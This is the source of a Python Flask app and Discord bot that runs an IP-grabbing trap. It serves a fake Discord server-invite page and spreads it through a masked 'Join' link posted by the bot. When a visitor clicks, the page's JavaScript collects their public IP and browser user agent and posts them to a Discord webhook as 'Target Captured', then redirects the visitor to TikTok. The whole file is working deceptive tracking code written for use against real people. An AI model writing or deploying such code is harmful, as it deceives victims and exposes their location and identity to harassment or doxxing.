# language: Python, file: app.py
import os
import socket
import requests
import threading
import discord
from discord.ext import commands
from flask import Flask, request, render_template_string

# Force IPv4 to prevent Railway boot hangs
_orig_getaddrinfo = socket.getaddrinfo
def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
    return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
socket.getaddrinfo = getaddrinfo_ipv4

app = Flask(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
RAILWAY_URL = "https://rnbw-production.up.railway.app"
# ---------------------

FAKE_JOIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        body { margin: 0; padding: 0; background-color: #313338; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background-color: #2b2d31; border-radius: 8px; width: 90%; max-width: 400px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.5); text-align: center; padding-bottom: 20px; }
        .banner { height: 120px; background: #1e1f22; }
        .icon { width: 80px; height: 80px; border-radius: 50%; border: 6px solid #2b2d31; background-color: #000; margin: -40px auto 10px auto; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 24px; }
        .title { font-size: 20px; font-weight: bold; margin-bottom: 8px; }
        .status { color: #b5bac1; font-size: 14px; margin-bottom: 20px; }
        .dot { height: 10px; width: 10px; background-color: #23a55a; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .btn { background-color: #23a55a; color: #fff; border: none; padding: 12px 24px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 80%; font-weight: bold; transition: 0.2s; }
        .btn:hover { background-color: #1e8e4e; }
    </style>
</head>
<body>
    <div class="card">
        <div class="banner"></div>
        <div class="icon">C😭s</div>
        <div class="title">CloudyPookie😭's server</div>
        <div class="status"><span class="dot"></span> 4 Online &nbsp; • &nbsp; 5 Members</div>
        <button class="btn" onclick="startTrap()">Join Server</button>
    </div>

    <script>
        async function startTrap() {
            document.querySelector('.btn').innerText = "Joining...";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                await fetch('/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: data.ip, ua: navigator.userAgent})
                });
            } catch (e) {}
            // Redirect to TikTok after grab
            window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(FAKE_JOIN_HTML)

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ip = data.get('ip', 'Unknown')
    ua = data.get('ua', 'Unknown')
    
    device = "Unknown"
    if "Windows" in ua: device = "Windows PC"
    elif "iPhone" in ua: device = "iPhone"
    elif "Android" in ua: device = "Android"
    elif "Macintosh" in ua: device = "Mac"

    payload = {
        "embeds": [{
            "title": "Target Captured",
            "color": 65280,
            "fields": [
                {"name": "Device Name", "value": f"```{device}```", "inline": False},
                {"name": "Public IP", "value": f"```{ip}```", "inline": False},
                {"name": "Wi-Fi Network", "value": "```N/A```", "inline": False}
            ]
        }]
    }
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)
    return "ok", 200

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}', flush=True)

@bot.command()
async def send(ctx):
    # This masks the link. They see "Join", but it goes to your Railway trap.
    trap_link = f"[Join]({RAILWAY_URL})"
    await ctx.send(f"Come hang out: {trap_link}")

def run_bot():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN missing.", flush=True)
        return
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"BOT CRASHED: {e}", flush=True)

threading.Thread(target=run_bot, daemon=True).start()
